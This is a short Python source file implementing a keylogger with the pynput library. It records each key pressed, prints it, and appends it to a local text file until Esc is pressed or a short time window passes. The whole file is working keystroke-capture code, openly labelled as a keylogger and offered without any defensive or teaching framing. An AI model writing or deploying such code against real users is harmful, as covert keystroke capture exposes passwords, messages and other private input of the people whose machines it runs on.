from pynput.keyboard import Key, Listener
import time


class KeyLogger:

    def __init__(self, file_path):
        self.file_path = file_path
        self.extend = "\\"
        self.keys_information = "keys_info.txt"

        self.count = 0
        self.keys = []
        self.number_of_iterations = 0
        self.time_iteration = 15
        self.currentTime = time.time()
        self.stoppingTime = time.time() + self.time_iteration

        with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()

    def on_press(self, key):
        print(key)
        self.keys.append(key)
        self.count += 1
        self.currentTime = time.time()

        if self.count >= 1:
            self.count = 0
            self.write_file()
            self.keys = []

    def write_file(self):
        with open(self.file_path + self.extend + self.keys_information, "a") as f:
            for key in self.keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()

    def on_release(self, key):
        if key == Key.esc:
            return False
        if self.currentTime > self.stoppingTime:
            return False
